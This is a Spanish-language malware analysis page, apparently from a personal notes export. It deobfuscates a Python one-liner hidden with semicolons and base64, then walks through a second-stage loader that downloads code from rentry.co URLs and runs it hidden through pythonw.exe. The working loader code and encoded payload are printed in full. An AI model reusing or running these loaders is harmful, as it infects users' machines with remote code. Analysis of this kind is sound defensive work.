<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Aislamiento del codigo encriptado</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Aislamiento del codigo encriptado</h1><br/><p></p><p><h3>Aquí vamos a extraer y analizar el código malicioso del script</h3></p><p></p><p><div class="codebox"><pre><br />;<span style="color:#ad7fa8;font-weight:400">import</span> os;os.system(<span style="color:#edd400;font-weight:400">&#39;pip install requests&#39;</span>);<span style="color:#ad7fa8;font-weight:400">import</span> requests;<span style="color:#ad7fa8;font-weight:400">import</span> base64;<span style="color:#729fcf;font-weight:400">exec</span>(base64.b64decode(<span style="color:#edd400;font-weight:400">&#39;ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmVudHJ5LmNvLzltdHBkZWR0L3JhdyIpLnRleHQp&#39;</span>).decode())</pre></div></p><p></p><p><h3>Algunas personas que no saben mucho sobre Python tal vez no estén al tanto de que Python no requiere el uso obligatorio de punto y coma. Sin embargo, este código es completamente válido en Python, donde puedes insertar una cantidad exagerada de espacios, dos puntos o punto y coma, y esto puede hacer que el código sea difícil de entender o descubrir.</h3></p><p></p><p><h3>Formateamos el código.</h3></p><p></p><p><div class="codebox"><pre><br /><span style="color:#ad7fa8;font-weight:400">import</span> os<br />os.system(<span style="color:#edd400;font-weight:400">&#39;pip install requests&#39;</span>)<br /><span style="color:#ad7fa8;font-weight:400">import</span> requests<br /><span style="color:#ad7fa8;font-weight:400">import</span> base64<br /><span style="color:#729fcf;font-weight:400">exec</span>(base64.b64decode(<span style="color:#edd400;font-weight:400">&#39;ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmVudHJ5LmNvLzltdHBkZWR0L3JhdyIpLnRleHQp&#39;</span>).decode())<br /></pre></div></p><p></p><p><h3>Vamos a necesitar instalar esas dependencias para poder continuar.</h3></p><p></p><p><div class="codebox"><pre><br />pip install requests base64</pre></div></p><p></p><p><h3>Modificamos y ejecutamos </h3></p><p></p><p><div class="codebox"><pre><br /><span style="color:#ad7fa8;font-weight:400">import</span> requests<br /><span style="color:#ad7fa8;font-weight:400">import</span> base64<br /><span style="color:#729fcf;font-weight:400">print</span>(base64.b64decode(<span style="color:#edd400;font-weight:400">&#39;ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmVudHJ5LmNvLzltdHBkZWR0L3JhdyIpLnRleHQp&#39;</span>).decode())<br /></pre></div></p><p></p><p><img src="images/4-1.png" alt="images/4-1.png" /></p><p></p><p><h3>Vemos lo que hay detrás</h3></p><p></p><p><h3>Basicamente hace un request get a esa url donde hay un código que introduce en un txt.</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3>Veamos el código</h3></p><p></p><p><div class="codebox"><pre><br /><span style="color:#ad7fa8;font-weight:400">from</span> <span style="color:#729fcf;font-weight:400">tempfile</span> <span style="color:#ad7fa8;font-weight:400">import</span> NamedTemporaryFile <span style="color:#ad7fa8;font-weight:400">as</span> _ffile<br /><span style="color:#ad7fa8;font-weight:400">from</span> <span style="color:#729fcf;font-weight:400">sys</span> <span style="color:#ad7fa8;font-weight:400">import</span> executable <span style="color:#ad7fa8;font-weight:400">as</span> _eexecutable<br /><span style="color:#ad7fa8;font-weight:400">from</span> <span style="color:#729fcf;font-weight:400">os</span> <span style="color:#ad7fa8;font-weight:400">import</span> system <span style="color:#ad7fa8;font-weight:400">as</span> _ssystem<br />_ttmp = _ffile(delete=<span style="color:#ce5c00;font-weight:400">False</span>)<br />_ttmp.write(<span style="color:#edd400;font-weight:400">b&quot;&quot;&quot;from urllib.request import urlopen as _uurlopen;exec(_uurlopen(&quot;https://rentry.co/6uh8vuwz/raw&quot;).read())&quot;&quot;&quot;</span>)<br />_ttmp.close()<br /><span style="color:#000000;font-weight:700">try</span>: _ssystem(f<span style="color:#edd400;font-weight:400">&quot;start {_eexecutable.replace(&#39;.exe&#39;, &#39;w.exe&#39;)} {_ttmp.name}&quot;</span>)<br /><span style="color:#000000;font-weight:700">except</span>: <span style="color:#000000;font-weight:700">pass</span><br /></pre></div></p><p><ul><li>• <h3>• </h3><code><h3>NamedTemporaryFile</h3></code><h3> de </h3><code><h3>tempfile</h3></code><h3> (como </h3><code><h3>_ffile</h3></code><h3>): Crea un archivo temporal en el sistema.</h3></li><li><code><h3>executable</h3></code><h3> de </h3><code><h3>sys</h3></code><h3> (como </h3><code><h3>_eexecutable</h3></code><h3>): Obtiene la ruta del ejecutable de Python que se está utilizando.</h3></li><li><code><h3>system</h3></code><h3> de </h3><code><h3>os</h3></code><h3> (como </h3><code><h3>_ssystem</h3></code><h3>): Ejecuta comandos del sistema operativo.</h3></li></ul></p><p></p><p><h3>Se crea un archivo temporal mediante </h3><code><h3>NamedTemporaryFile</h3></code><h3>, que no será eliminado automáticamente (</h3><code><h3>delete=False</h3></code><h3>).</h3></p><p></p><p><h3>Usa </h3><code><h3>urlopen</h3></code><h3> de </h3><code><h3>urllib.request</h3></code><h3> para descargar y ejecutar código desde la URL </h3><code><h3>https://rentry.co/6uh8vuwz/raw</h3></code><h3> usando la función </h3><code><h3>exec</h3></code><h3>. Es decir, descarga el contenido en esa URL y lo ejecuta como código Python.</h3></p><p><h3></h3></p><p><h3>Luego, intenta ejecutar dicho archivo utilizando </h3><code><h3>pythonw.exe</h3></code><h3> (una versión de Python que no muestra la ventana de consola).</h3><h3></h3></p><p><h3>Es un ejemplo clásico de un descargador de código remoto, comúnmente utilizado en scripts maliciosos o automatización remota.</h3></p><p></p><p><h3>Veamos el nuevo código que intenta ejecutar en el siguiente punto.</h3></p></div>
</body>
</html>
